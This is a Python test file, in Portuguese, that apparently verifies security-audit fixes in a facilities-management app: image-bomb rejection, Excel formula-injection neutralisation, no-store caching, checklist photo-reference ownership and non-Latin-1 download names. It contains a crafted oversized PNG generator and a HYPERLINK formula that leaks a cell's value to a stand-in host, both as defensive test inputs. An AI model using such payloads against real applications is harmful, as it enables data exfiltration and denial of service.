"""Arquivos e relatório (auditoria de segurança, bloco C, 19/10/2026).

* SEC-005: imagem-bomba recusada no envio e no PDF do relatório.
* SEC-009: texto com "=" vira texto, não fórmula, no Excel.
* SEC-014: tela e arquivo de quem está logado vão com ``no-store``.
* SEC-019: a foto de referência só vale com a chave do próprio checklist.
* SEC-025: nome de local fora do Latin-1 não quebra o download.
"""
import io
import struct
import zlib

import pytest

from tests import fabrica
from tests.test_relatorio_cliente import _dados, cena  # noqa: F401 (fixture)
from tests.test_rotas_servico import Arquivo, _png


def _png_de(largura, altura):
    """Só o cabeçalho de um PNG enorme: pesa bytes, "abre" com 169 MP."""
    def bloco(tipo, dados):
        c = tipo + dados
        return struct.pack('>I', len(dados)) + c + struct.pack('>I', zlib.crc32(c))
    return (b'\x89PNG\r\n\x1a\n'
            + bloco(b'IHDR', struct.pack('>IIBBBBB', largura, altura, 8, 2, 0, 0, 0))
            + bloco(b'IDAT', zlib.compress(b'\x00' * 16)) + bloco(b'IEND', b''))


BOMBA = _png_de(13000, 13000)


# ── SEC-005 ───────────────────────────────────────────────────────────────

def test_imagem_aceitavel():
    from facilities.core.anexos import imagem_aceitavel
    assert imagem_aceitavel(_png(), 'png')
    assert not imagem_aceitavel(BOMBA, 'png')
    assert not imagem_aceitavel(b'\x89PNG\r\n\x1a\nlixo', 'png')
    # WebP de verdade tem "WEBP" depois do RIFF; WAV/AVI não passam.
    assert not imagem_aceitavel(b'RIFF\x00\x00\x00\x00WAVEfmt ', 'webp')
    # Outros tipos passam (a assinatura é conferida por quem chama).
    assert imagem_aceitavel(b'%PDF-1.4', 'pdf')


def test_bomba_recusada_na_foto_do_checklist(app_module):
    from facilities.rotas.servico import RegraDaRota, ler_imagem
    with app_module.app.app_context():
        with pytest.raises(RegraDaRota):
            ler_imagem(Arquivo(BOMBA, 'foto.png'))
        assert ler_imagem(Arquivo(_png(), 'foto.png'))[1] == 'png'


def test_pdf_pula_a_bomba_e_reduz_a_foto(app_module):
    from PIL import Image as Pil
    from facilities.relatorios.arquivos import LADO_MAX_NO_PDF, _imagem
    with pytest.raises(ValueError):
        _imagem(BOMBA, 100, 100)
    grande = io.BytesIO()
    Pil.new('RGB', (4000, 3000), 'white').save(grande, 'PNG')
    img = _imagem(grande.getvalue(), 100, 100)
    assert max(img.imageWidth, img.imageHeight) <= LADO_MAX_NO_PDF


# ── SEC-009 e SEC-025 (no cenário do relatório do cliente) ─────────────────

FORMULA = '=HYPERLINK("https://exemplo.invalid/?x="&A2,"Clique")'


def test_excel_grava_texto_e_nao_formula(app_module, cena):
    from openpyxl import load_workbook
    from app import db
    from facilities.chamados.models import Chamado
    from facilities.relatorios import arquivos
    with app_module.app.app_context():
        db.session.get(Chamado, cena['chamado']).titulo = FORMULA
        db.session.commit()
        corpo = arquivos.excel(_dados(app_module, cena))
    wb = load_workbook(io.BytesIO(corpo))
    celulas = [c for ws in wb.worksheets for linha in ws.iter_rows() for c in linha
               if c.value == FORMULA]
    assert celulas and all(c.data_type == 's' for c in celulas)


def test_nome_do_local_fora_do_latin1_baixa(app_module, cena):
    from app import Client, db
    with app_module.app.app_context():
        loc = db.session.get(Client, cena['local'])
        original, loc.name = loc.name, 'Łódź 中心'
        db.session.commit()
    try:
        coord = fabrica.entrar(app_module, 'coord.rel@trino.com')
        for formato in ('pdf', 'xlsx'):
            r = coord.get(f"/relatorios/cliente/{cena['local']}/2026-09/arquivo.{formato}")
            assert r.status_code == 200
            cabecalho = r.headers['Content-Disposition']
            cabecalho.encode('latin-1')           # o gunicorn exige Latin-1
            assert 'attachment' in cabecalho and f'.{formato}' in cabecalho
    finally:
        with app_module.app.app_context():
            db.session.get(Client, cena['local']).name = original
            db.session.commit()


# ── SEC-014 ───────────────────────────────────────────────────────────────

def test_tela_logada_sem_cache_e_estatico_com_cache(app_module):
    with app_module.app.app_context():
        fabrica.pessoa(app_module, 'cache@trino.com', 'pleno', locais=['Shopping Centro'])
    c = fabrica.entrar(app_module, 'cache@trino.com')
    assert c.get('/').headers.get('Cache-Control') == 'no-store'
    r = c.get('/static/pwa/icone-192.png')
    assert r.headers.get('Cache-Control') != 'no-store'
    # Sem login (tela de entrar), sem a regra.
    assert app_module.app.test_client().get('/login').headers.get('Cache-Control') != 'no-store'


# ── SEC-019 ───────────────────────────────────────────────────────────────

def test_referencia_de_outro_checklist_nao_e_aceita(app_module):
    from app import db
    from facilities.rotas import servico as s
    with app_module.app.app_context():
        fabrica.estrutura(app_module)
        m = s.criar_modelo(fabrica.local().id, {'nome': 'Banheiro'}, None)
        db.session.flush()
        propria = f'checklists/{m.id}/ref/{"a" * 32}.png'
        alheia = f'checklists/{m.id + 999}/ref/{"b" * 32}.png'
        itens = s.normalizar_itens([
            {'texto': 'Piso limpo?', 'tipo': 'sim_nao', 'foto_ref': propria},
            {'texto': 'Pia limpa?', 'tipo': 'sim_nao', 'foto_ref': alheia}], modelo=m)
        assert itens[0].get('foto_ref') == propria
        assert 'foto_ref' not in itens[1]
        db.session.rollback()
